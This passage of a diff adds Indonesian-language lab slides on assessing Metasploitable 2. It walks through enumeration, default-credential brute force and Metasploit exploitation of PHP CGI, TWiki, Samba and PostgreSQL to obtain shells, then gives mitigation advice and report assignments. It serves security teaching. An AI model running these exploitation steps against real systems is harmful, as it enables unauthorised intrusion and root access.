+    <p>PHP yang berjalan dalam mode CGI rentan terhadap injeksi argumen yang memungkinkan eksekusi kode jarak jauh</p>
+  </div>
+  <div class="slide-body">
+    <div class="card-grid-2" style="margin-bottom:14px;">
+      <div>
+        <h3 class="section-h">Enumerasi Web dengan Dirb</h3>
+        <div class="code-label">Terminal – Kali Linux</div>
+        <div class="code-block">
+<span class="prompt">$</span> <span class="cmd">dirb</span> <span class="ip">192.168.39.135</span>
+<br><br>
+<span class="comment"># Akan menemukan direktori dan file seperti:</span>
+<span class="comment"># /phpinfo.php</span>
+<span class="comment"># /twiki/</span>
+<span class="comment"># /mutillidae/</span>
+<span class="comment"># /dvwa/</span>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Cek PHP Info</h3>
+        <p style="font-size:13px;color:#555;margin-bottom:10px;">Akses URL berikut di browser:</p>
+        <div class="code-block">
+<span class="cmd">http://</span><span class="ip">192.168.39.135</span><span class="cmd">/phpinfo.php</span>
+        </div>
+        <p style="font-size:12.5px;color:#555;margin-top:8px;">Cari informasi:</p>
+        <ul style="font-size:12.5px;color:#444;margin-left:20px;margin-top:6px;line-height:2;">
+          <li><strong>PHP Version:</strong> 5.2.4</li>
+          <li><strong>Server API:</strong> CGI/FastCGI</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="vuln-box http">
+      <h3>📋 Profil Kerentanan</h3>
+      <table class="vuln-table">
+        <tr><td>Service / Protocol</td><td>HTTP</td></tr>
+        <tr><td>Nama Program</td><td>PHP (berjalan sebagai CGI)</td></tr>
+        <tr><td>Versi</td><td>5.2.4</td></tr>
+        <tr><td>Jenis Kerentanan</td><td>CGI Bin Remote Code Execution (Argument Injection)</td></tr>
+        <tr><td>Referensi</td><td>https://www.exploit-db.com/exploits/29290</td></tr>
+        <tr><td>Modul Metasploit</td><td><code>exploit/multi/http/php_cgi_arg_injection</code></td></tr>
+      </table>
+    </div>
+
+    <div class="info-box orange">
+      <span class="info-icon">💡</span>
+      <div><strong>Mengapa Berbahaya?</strong> PHP dalam mode CGI memproses setiap request sebagai proses terpisah. Kerentanan ini memungkinkan penyerang menyisipkan argumen PHP melalui URL query string, yang kemudian dieksekusi oleh interpreter PHP sebagai perintah sistem.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 8 – PHP CGI VALIDASI -->
+<div class="slide" id="s8" data-title="Validasi Kerentanan PHP CGI – Metasploit">
+  <div class="slide-header">
+    <div class="section-label">Validasi 2 – Port 80 / PHP CGI</div>
+    <h2>Validasi PHP 5.2.4 CGI Arg Injection via Metasploit</h2>
+    <p>Ikuti langkah-langkah berikut secara berurutan di terminal Kali Linux</p>
+  </div>
+  <div class="slide-body">
+    <div class="step-list">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <strong>Jalankan Metasploit (jika belum berjalan)</strong>
+          <div class="code-label">Terminal</div>
+          <div class="code-block"><span class="prompt">$</span> <span class="cmd">sudo msfconsole</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <strong>Cari dan pilih modul exploit PHP CGI</strong>
+          <div class="code-label">msf6 &gt;</div>
+          <div class="code-block">
+<span class="cmd">search</span> php_cgi
+<br><span class="cmd">use</span> exploit/multi/http/php_cgi_arg_injection
+          </div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <strong>Cek opsi – perhatikan parameter RHOSTS, RPORT, dan TARGETURI</strong>
+          <div class="code-label">msf6 exploit(php_cgi_arg_injection) &gt;</div>
+          <div class="code-block"><span class="cmd">show options</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <strong>Konfigurasi dan jalankan exploit</strong>
+          <div class="code-label">msf6 exploit(php_cgi_arg_injection) &gt;</div>
+          <div class="code-block">
+<span class="cmd">set</span> rhosts <span class="ip">192.168.39.135</span>
+<br><span class="cmd">set</span> rport 80
+<br><span class="cmd">exploit</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box green">
+      <span class="info-icon">✅</span>
+      <div><strong>Hasil yang diharapkan:</strong> Metasploit akan membuka sesi Meterpreter pada mesin target. Anda dapat menjalankan perintah seperti <code>sysinfo</code>, <code>getuid</code>, atau <code>shell</code> untuk berinteraksi dengan sistem target.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 9 – TWIKI IDENTIFIKASI -->
+<div class="slide" id="s9" data-title="Kerentanan HTTP – TWiki Command Exec">
+  <div class="slide-header">
+    <div class="section-label">Kerentanan 3 – Port 80 / TWiki</div>
+    <h2>HTTP – TWiki 'rev' Parameter Command Execution</h2>
+    <p>Aplikasi TWiki yang terinstal pada Metasploitable 2 rentan terhadap eksekusi perintah melalui parameter 'rev'</p>
+  </div>
+  <div class="slide-body">
+    <div class="card-grid-2" style="margin-bottom:14px;">
+      <div>
+        <h3 class="section-h">Apa itu TWiki?</h3>
+        <div class="card" style="border-left:4px solid #f39c12;">
+          <p style="font-size:13px;color:#555;line-height:1.65;">TWiki adalah platform wiki open-source untuk kolaborasi tim dan manajemen pengetahuan (knowledge management). TWiki sering digunakan sebagai basis pengetahuan atau dokumentasi internal dalam organisasi.</p>
+        </div>
+        <p style="font-size:12.5px;color:#666;margin-top:10px;">Cek versi TWiki melalui URL:</p>
+        <div class="code-block">
+http://<span class="ip">192.168.39.135</span>/twiki/
+<br>http://<span class="ip">192.168.39.135</span>/twiki/bin/view/TWiki/TWikiHistory
+        </div>
+      </div>
+      <div>
+        <div class="vuln-box http" style="border-color:#f39c12;">
+          <h3>📋 Profil Kerentanan</h3>
+          <table class="vuln-table">
+            <tr><td>Service</td><td>HTTP</td></tr>
+            <tr><td>Program</td><td>TWiki</td></tr>
+            <tr><td>Versi</td><td>~2003 (TWikiRelease20030201)</td></tr>
+            <tr><td>Kerentanan</td><td>TWikiHistory 'rev' Command Execution</td></tr>
+            <tr><td>Exploit-DB</td><td>ID: 16892</td></tr>
+            <tr><td>Modul MSF</td><td><code>exploit/unix/webapp/twiki_history</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <h3 class="section-h">Cek Kerentanan dengan Searchsploit</h3>
+    <div class="code-label">Terminal – Kali Linux</div>
+    <div class="code-block">
+<span class="prompt">$</span> <span class="cmd">searchsploit</span> twiki
+<br><br>
+<span class="comment">----------------------------------------------------------------------</span>
+<span class="comment"> TWiki &lt;= 20040902 - 'rev' Shell Command Execution | 16892.rb</span>
+<span class="comment">----------------------------------------------------------------------</span>
+    </div>
+
+    <div class="info-box orange">
+      <span class="info-icon">💡</span>
+      <div><strong>Mekanisme:</strong> TWiki versi lama memungkinkan eksekusi perintah OS melalui parameter <code>rev</code> dalam URL. Penyerang dapat menyisipkan perintah sistem yang kemudian dieksekusi oleh web server dengan hak akses web server.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 10 – TWIKI VALIDASI -->
+<div class="slide" id="s10" data-title="Validasi Kerentanan TWiki – Metasploit">
+  <div class="slide-header">
+    <div class="section-label">Validasi 3 – Port 80 / TWiki</div>
+    <h2>Validasi TWiki 'rev' Command Execution via Metasploit</h2>
+    <p>Ikuti langkah-langkah berikut secara berurutan di terminal Kali Linux</p>
+  </div>
+  <div class="slide-body">
+    <div class="step-list">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <strong>Buka Metasploit dan cari modul TWiki</strong>
+          <div class="code-label">msf6 &gt;</div>
+          <div class="code-block"><span class="cmd">search</span> twiki</div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <strong>Pilih modul exploit twiki_history</strong>
+          <div class="code-label">msf6 &gt;</div>
+          <div class="code-block"><span class="cmd">use</span> exploit/unix/webapp/twiki_history</div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <strong>Cek opsi modul</strong>
+          <div class="code-label">msf6 exploit(twiki_history) &gt;</div>
+          <div class="code-block"><span class="cmd">show options</span> &nbsp;<span class="comment"># Perhatikan RHOSTS dan TARGETURI</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <strong>Konfigurasi dan jalankan exploit</strong>
+          <div class="code-label">msf6 exploit(twiki_history) &gt;</div>
+          <div class="code-block">
+<span class="cmd">set</span> rhosts <span class="ip">192.168.39.135</span>
+<br><span class="cmd">exploit</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box green">
+      <span class="info-icon">✅</span>
+      <div><strong>Hasil yang diharapkan:</strong> Metasploit membuka sesi command shell pada mesin target. Jalankan perintah <code>id</code> atau <code>whoami</code> untuk memverifikasi level akses yang diperoleh.</div>
+    </div>
+
+    <div class="card" style="border-left:4px solid #f39c12;margin-top:10px;">
+      <p style="font-size:12.5px;color:#555;"><strong>🔑 Poin Pembelajaran:</strong> Aplikasi web yang sudah usang dan tidak diperbarui adalah salah satu vektor serangan paling umum. TWiki versi 2003 seharusnya sudah dinonaktifkan atau diperbarui ke versi terbaru.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 11 – SMB IDENTIFIKASI -->
+<div class="slide" id="s11" data-title="Kerentanan SMB – Samba 3.0.20">
+  <div class="slide-header">
+    <div class="section-label">Kerentanan 4 – Port 139/445</div>
+    <h2>SMB – Samba 3.0.20 'Username' Map Script</h2>
+    <p>Samba adalah implementasi open-source dari protokol SMB untuk sistem Unix/Linux</p>
+  </div>
+  <div class="slide-body">
+    <div class="card-grid-2" style="margin-bottom:14px;">
+      <div>
+        <h3 class="section-h">Enumerasi SMB dengan smbclient</h3>
+        <p style="font-size:13px;color:#555;margin-bottom:8px;">Cek apakah anonymous login diizinkan:</p>
+        <div class="code-label">Terminal – Kali Linux</div>
+        <div class="code-block">
+<span class="prompt">$</span> <span class="cmd">smbclient</span> <span class="flag">-L</span> //<span class="ip">192.168.39.135</span>/tmp
+<br><br>
+<span class="comment"># Tekan Enter saat diminta password</span>
+<span class="comment"># Jika berhasil: terlihat daftar shares</span>
+<span class="comment"># Informasi versi: Samba 3.0.20-Debian</span>
+        </div>
+      </div>
+      <div>
+        <div class="vuln-box smb">
+          <h3>📋 Profil Kerentanan</h3>
+          <table class="vuln-table">
+            <tr><td>Service</td><td>SMB (Server Message Block)</td></tr>
+            <tr><td>Program</td><td>Samba</td></tr>
+            <tr><td>Versi</td><td>3.0.20-Debian</td></tr>
+            <tr><td>Kerentanan</td><td>'Username' map script Command Execution</td></tr>
+            <tr><td>Exploit-DB</td><td>ID: 16320</td></tr>
+            <tr><td>Modul MSF</td><td><code>exploit/multi/samba/usermap_script</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box blue">
+      <span class="info-icon">💡</span>
+      <div><strong>Mengapa Port 139 dan 445?</strong> Samba menggunakan kedua port ini. Port 139 adalah NetBIOS over TCP/IP (warisan lama), sementara port 445 adalah SMB langsung over TCP. Keduanya aktif secara bersamaan pada Metasploitable 2.</div>
+    </div>
+
+    <div class="info-box orange">
+      <span class="info-icon">⚙️</span>
+      <div><strong>Mekanisme Serangan:</strong> Kerentanan ini ada pada fitur "username map script" di konfigurasi Samba. Ketika username yang dikirim mengandung metacharacter shell, perintah tersebut dieksekusi oleh Samba dengan hak akses root.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 12 – SMB VALIDASI -->
+<div class="slide" id="s12" data-title="Validasi Kerentanan SMB – Metasploit">
+  <div class="slide-header">
+    <div class="section-label">Validasi 4 – Port 139/445 / SMB</div>
+    <h2>Validasi Samba 3.0.20 Usermap Script via Metasploit</h2>
+    <p>Ikuti langkah-langkah berikut secara berurutan di terminal Kali Linux</p>
+  </div>
+  <div class="slide-body">
+    <div class="step-list">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <strong>Buka Metasploit dan cari modul Samba</strong>
+          <div class="code-label">msf6 &gt;</div>
+          <div class="code-block"><span class="cmd">search</span> samba usermap</div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <strong>Pilih modul exploit usermap_script</strong>
+          <div class="code-label">msf6 &gt;</div>
+          <div class="code-block"><span class="cmd">use</span> exploit/multi/samba/usermap_script</div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <strong>Cek opsi yang diperlukan</strong>
+          <div class="code-label">msf6 exploit(usermap_script) &gt;</div>
+          <div class="code-block"><span class="cmd">show options</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <strong>Konfigurasi target dan jalankan exploit</strong>
+          <div class="code-label">msf6 exploit(usermap_script) &gt;</div>
+          <div class="code-block">
+<span class="cmd">set</span> rhosts <span class="ip">192.168.39.135</span>
+<br><span class="cmd">exploit</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box green">
+      <span class="info-icon">✅</span>
+      <div><strong>Hasil yang diharapkan:</strong> Berhasil mendapatkan sesi command shell dengan hak akses <strong>root</strong>. Verifikasi dengan menjalankan perintah <code>id</code> yang seharusnya menampilkan <code>uid=0(root)</code>.</div>
+    </div>
+
+    <div class="card" style="border-left:4px solid #2980b9;margin-top:10px;">
+      <p style="font-size:12.5px;color:#555;"><strong>📝 Catatan Penting:</strong> Samba 3.0.20 dirilis pada tahun 2004. Penggunaan versi software yang sudah sangat usang adalah salah satu penyebab utama pelanggaran keamanan pada dunia nyata (contoh: EternalBlue / WannaCry pada SMB Windows).</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 13 – POSTGRESQL IDENTIFIKASI -->
+<div class="slide" id="s13" data-title="Kerentanan PostgreSQL – Brute Force + UDF">
+  <div class="slide-header">
+    <div class="section-label">Kerentanan 5 – Port 5432</div>
+    <h2>PostgreSQL 8.3.1 – Weak Credential + UDF Execution</h2>
+    <p>Database PostgreSQL menggunakan kredensial default yang mudah ditebak, lalu dieksploitasi untuk eksekusi kode</p>
+  </div>
+  <div class="slide-body">
+    <h3 class="section-h">Tahap 1: Brute Force Login PostgreSQL</h3>
+    <div class="code-label">msf6 &gt; (menggunakan modul Auxiliary Scanner)</div>
+    <div class="code-block">
+<span class="cmd">use</span> auxiliary/scanner/postgres/postgres_login
+<br><span class="cmd">show options</span>
+<br><span class="cmd">set</span> rhosts <span class="ip">192.168.39.135</span>
+<br><span class="cmd">run</span>
+<br><br>
+<span class="comment"># Hasil yang diharapkan:</span>
+<span class="comment"># [+] 192.168.39.135:5432 - Login Successful: postgres:postgres</span>
+    </div>
+
+    <div class="vuln-box sql" style="margin-top:14px;">
+      <h3>📋 Profil Kerentanan</h3>
+      <table class="vuln-table">
+        <tr><td>Service</td><td>Database (PostgreSQL)</td></tr>
+        <tr><td>Program</td><td>PostgreSQL</td></tr>
+        <tr><td>Versi</td><td>8.3.1</td></tr>
+        <tr><td>Kerentanan 1</td><td>Default/Weak Credential: <code>postgres:postgres</code></td></tr>
+        <tr><td>Kerentanan 2</td><td>UDF (User-Defined Function) for Command Execution</td></tr>
+        <tr><td>Exploit-DB</td><td>ID: 7855</td></tr>
+        <tr><td>Modul MSF</td><td><code>exploit/linux/postgres/postgres_payload</code></td></tr>
+      </table>
+    </div>
+
+    <div class="info-box orange">
+      <span class="info-icon">💡</span>
+      <div><strong>Pola Serangan 2 Tahap:</strong> Pertama, penyerang mendapatkan akses ke database menggunakan kredensial default. Kemudian memanfaatkan fitur UDF PostgreSQL untuk mengeksekusi perintah OS dari dalam database dengan hak akses postgres.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 14 – POSTGRESQL VALIDASI -->
+<div class="slide" id="s14" data-title="Validasi Kerentanan PostgreSQL – Metasploit">
+  <div class="slide-header">
+    <div class="section-label">Validasi 5 – Port 5432 / PostgreSQL</div>
+    <h2>Validasi PostgreSQL UDF Payload via Metasploit</h2>
+    <p>Setelah mendapatkan kredensial, lanjutkan dengan eksploitasi UDF untuk Remote Code Execution</p>
+  </div>
+  <div class="slide-body">
+    <div class="step-list">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <strong>Pilih modul exploit PostgreSQL payload</strong>
+          <div class="code-label">msf6 &gt;</div>
+          <div class="code-block"><span class="cmd">use</span> exploit/linux/postgres/postgres_payload</div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <strong>Cek deskripsi modul untuk memahami cara kerja exploit</strong>
+          <div class="code-label">msf6 exploit(postgres_payload) &gt;</div>
+          <div class="code-block"><span class="cmd">info</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <strong>Cek opsi – perhatikan USERNAME, PASSWORD, dan RHOSTS</strong>
+          <div class="code-label">msf6 exploit(postgres_payload) &gt;</div>
+          <div class="code-block"><span class="cmd">show options</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <strong>Konfigurasi menggunakan kredensial yang ditemukan dan jalankan exploit</strong>
+          <div class="code-label">msf6 exploit(postgres_payload) &gt;</div>
+          <div class="code-block">
+<span class="cmd">set</span> rhosts <span class="ip">192.168.39.135</span>
+<br><span class="cmd">set</span> username postgres
+<br><span class="cmd">set</span> password postgres
+<br><span class="cmd">exploit</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box green">
+      <span class="info-icon">✅</span>
+      <div><strong>Hasil yang diharapkan:</strong> Metasploit membuka sesi Meterpreter atau command shell dengan hak akses postgres. Tangkap output perintah <code>sysinfo</code> dan <code>getuid</code> sebagai bukti keberhasilan.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 15 – TABEL REKAP -->
+<div class="slide" id="s15" data-title="Rekapitulasi Temuan Kerentanan">
+  <div class="slide-header">
+    <div class="section-label">Rekapitulasi</div>
+    <h2>Tabel Temuan Kerentanan – Metasploitable 2</h2>
+    <p>Dokumen ini menjadi dasar pembuatan laporan vulnerability assessment</p>
+  </div>
+  <div class="slide-body">
+    <table class="summary-table">
+      <thead>
+        <tr>
+          <th>No</th>
+          <th>Port</th>
+          <th>Service</th>
+          <th>Program &amp; Versi</th>
+          <th>Jenis Kerentanan</th>
+          <th>Severity</th>
+          <th>Modul Metasploit</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>1</td>
+          <td><strong>21/TCP</strong></td>
+          <td>FTP</td>
+          <td>VSFTPD 2.3.4</td>
+          <td>Backdoor Command Execution</td>
+          <td><span class="tag tag-red">Critical</span></td>
+          <td><code style="font-size:11px;">vsftpd_234_backdoor</code></td>
+        </tr>
+        <tr>
+          <td>2</td>
+          <td><strong>80/TCP</strong></td>
+          <td>HTTP</td>
+          <td>PHP 5.2.4 (CGI)</td>
+          <td>CGI Arg Injection / RCE</td>
+          <td><span class="tag tag-red">Critical</span></td>
+          <td><code style="font-size:11px;">php_cgi_arg_injection</code></td>
+        </tr>
+        <tr>
+          <td>3</td>
+          <td><strong>80/TCP</strong></td>
+          <td>HTTP</td>
+          <td>TWiki ~2003</td>
+          <td>'rev' Param Command Execution</td>
+          <td><span class="tag tag-orange">High</span></td>
+          <td><code style="font-size:11px;">twiki_history</code></td>
+        </tr>
+        <tr>
+          <td>4</td>
+          <td><strong>139,445/TCP</strong></td>
+          <td>SMB</td>
+          <td>Samba 3.0.20</td>
+          <td>Usermap Script Command Exec</td>
+          <td><span class="tag tag-red">Critical</span></td>
+          <td><code style="font-size:11px;">usermap_script</code></td>
+        </tr>
+        <tr>
+          <td>5</td>
+          <td><strong>5432/TCP</strong></td>
+          <td>Database</td>
+          <td>PostgreSQL 8.3.1</td>
+          <td>Weak Cred + UDF Command Exec</td>
+          <td><span class="tag tag-orange">High</span></td>
+          <td><code style="font-size:11px;">postgres_payload</code></td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3 class="section-h" style="margin-top:20px;">Referensi Exploit-DB</h3>
+    <div class="card-grid-2">
+      <div class="card" style="border-top:3px solid #e74c3c;padding:12px 16px;">
+        <div style="font-size:12px;color:#888;margin-bottom:4px;">VSFTPD 2.3.4</div>
+        <div style="font-size:12.5px;font-weight:600;">exploit-db.com/exploits/<strong>17491</strong></div>
+      </div>
+      <div class="card" style="border-top:3px solid #e67e22;padding:12px 16px;">
+        <div style="font-size:12px;color:#888;margin-bottom:4px;">PHP 5.2.4 CGI</div>
+        <div style="font-size:12.5px;font-weight:600;">exploit-db.com/exploits/<strong>29290</strong></div>
+      </div>
+      <div class="card" style="border-top:3px solid #f39c12;padding:12px 16px;">
+        <div style="font-size:12px;color:#888;margin-bottom:4px;">TWiki History</div>
+        <div style="font-size:12.5px;font-weight:600;">exploit-db.com/exploits/<strong>16892</strong></div>
+      </div>
+      <div class="card" style="border-top:3px solid #2980b9;padding:12px 16px;">
+        <div style="font-size:12px;color:#888;margin-bottom:4px;">Samba 3.0.20 / PostgreSQL</div>
+        <div style="font-size:12.5px;font-weight:600;">exploit-db.com/exploits/<strong>16320</strong> &amp; <strong>7855</strong></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 16 – TUGAS LAPORAN -->
+<div class="slide" id="s16" data-title="Tugas & Laporan Praktik">
+  <div class="slide-header">
+    <div class="section-label">Tugas Praktik</div>
+    <h2>Panduan Penulisan Laporan</h2>
+    <p>Laporan praktik harus diserahkan sesuai format di bawah dan mencantumkan bukti screenshot dari setiap tahap</p>
+  </div>
+  <div class="slide-body">
+    <div class="card-grid-2">
+      <div>
+        <h3 class="section-h">Format Laporan</h3>
+        <ul style="font-size:13px;color:#444;line-height:2.2;list-style:none;">
+          <li>📄 <strong>1. Pendahuluan</strong> – Tujuan praktik &amp; lingkungan lab</li>
+          <li>🔍 <strong>2. Identifikasi Aset</strong> – Hasil nmap scan lengkap</li>
+          <li>⚠️ <strong>3. Identifikasi Kerentanan</strong> – Tabel untuk setiap service</li>
+          <li>🧪 <strong>4. Validasi Kerentanan</strong> – Screenshot setiap eksploitasi</li>
+          <li>📊 <strong>5. Rekapitulasi</strong> – Tabel temuan &amp; severity</li>
+          <li>🛡️ <strong>6. Rekomendasi</strong> – Saran mitigasi per kerentanan</li>
+          <li>📎 <strong>7. Referensi</strong> – Exploit-DB ID, CVE jika ada</li>
+        </ul>
+      </div>
+      <div>
+        <h3 class="section-h">Template Tabel Kerentanan</h3>
+        <div class="card" style="font-size:12px;border-top:3px solid var(--pssn-blue);">
+          <table style="width:100%;border-collapse:collapse;">
+            <tr style="background:#f0f4f8;"><td style="padding:6px 8px;font-weight:700;color:#555;width:45%;">Field</td><td style="padding:6px 8px;font-weight:700;color:#555;">Isi</td></tr>
+            <tr><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#888;">Service/Protocol</td><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#aaa;">[isi]</td></tr>
+            <tr><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#888;">Nama Program</td><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#aaa;">[isi]</td></tr>
+            <tr><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#888;">Versi</td><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#aaa;">[isi]</td></tr>
+            <tr><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#888;">Kerentanan</td><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#aaa;">[isi]</td></tr>
+            <tr><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#888;">Referensi</td><td style="padding:5px 8px;border-bottom:1px solid #eee;color:#aaa;">[isi]</td></tr>
+            <tr><td style="padding:5px 8px;color:#888;">Bukti Screenshot</td><td style="padding:5px 8px;color:#aaa;">[lampirkan]</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <h3 class="section-h" style="margin-top:16px;">Rekomendasi Mitigasi</h3>
+    <div class="card-grid-2">
+      <div class="info-box green" style="margin:0;">
+        <span class="info-icon">🛡️</span>
+        <div style="font-size:12.5px;">
+          <strong>FTP, PHP, TWiki, Samba:</strong> Update/upgrade ke versi terbaru. Nonaktifkan layanan yang tidak diperlukan. Terapkan prinsip <em>least privilege</em>.
+        </div>
+      </div>
+      <div class="info-box blue" style="margin:0;">
+        <span class="info-icon">🔐</span>
+        <div style="font-size:12.5px;">
+          <strong>PostgreSQL:</strong> Ganti password default segera. Terapkan kebijakan password yang kuat. Batasi akses database hanya dari IP yang diizinkan.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 17 – TUGAS 1: ANALISIS CIA & CWE (WEEK 1) -->
+<div class="slide" id="s17" data-title="Tugas 1 – Analisis Dampak CIA & Klasifikasi CWE (Kaitan Week 1)">
+  <div class="slide-header">
+    <div class="section-label">Tugas Praktik 1 — Kaitan Week 1</div>
+    <h2>Tugas 1: Analisis Dampak CIA &amp; Klasifikasi Kerentanan (CWE)</h2>
+    <p>Hubungkan temuan praktikum dengan konsep Triad CIA dan jenis kerawanan yang dipelajari pada Pertemuan 1</p>
+  </div>
+  <div class="slide-body">
+    <div class="info-box blue" style="margin-bottom:16px;">
+      <span class="info-icon">📚</span>
+      <div><strong>Koneksi ke Materi Week 1:</strong> Pertemuan 1 membahas jenis-jenis kerawanan perangkat lunak (CWE), prinsip Triad CIA (Confidentiality–Integrity–Availability), dan terminologi keamanan dasar. Tugas ini menerapkan konsep tersebut pada temuan nyata dari lab Metasploitable 2.</div>
+    </div>
+
+    <h3 class="section-h">Instruksi Tugas</h3>
+    <div class="step-list">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <strong>Klasifikasikan setiap kerentanan ke dalam kategori CWE</strong>
+          <p>Untuk ke-5 kerentanan yang ditemukan (VSFTPD, PHP CGI, TWiki, Samba, PostgreSQL), identifikasi nomor CWE yang paling sesuai. Gunakan referensi: <code>cwe.mitre.org</code></p>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <strong>Analisis dampak terhadap Triad CIA</strong>
+          <p>Tentukan aspek CIA mana yang terdampak oleh setiap kerentanan. Berikan justifikasi singkat (1–2 kalimat) untuk setiap penilaian Anda.</p>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <strong>Klasifikasikan jenis kerentanan (berdasarkan penyebab akar)</strong>
+          <p>Apakah kerentanan disebabkan oleh: <em>Backdoor</em>, <em>Misconfiguration</em>, <em>Unpatched Software</em>, <em>Weak Credential</em>, atau <em>Design Flaw</em>? Jelaskan alasannya.</p>
+        </div>
+      </div>
+    </div>
+
+    <h3 class="section-h">Template Tabel Jawaban</h3>
+    <table class="summary-table">
+      <thead>
+        <tr>
+          <th>Kerentanan</th>
+          <th>Nomor CWE</th>
+          <th>Jenis Penyebab</th>
+          <th>C (Confidentiality)</th>
+          <th>I (Integrity)</th>
+          <th>A (Availability)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>VSFTPD 2.3.4 Backdoor</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+        </tr>
+        <tr>
+          <td>PHP 5.2.4 CGI RCE</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+        </tr>
+        <tr>
+          <td>TWiki Command Exec</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+        </tr>
+        <tr>
+          <td>Samba 3.0.20 Usermap</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+        </tr>
+        <tr>
+          <td>PostgreSQL Weak Cred</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">[isi]</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+          <td style="color:#aaa;font-style:italic;">High/Med/Low</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="card" style="border-left:4px solid var(--pssn-gold);margin-top:12px;padding:12px 16px;">
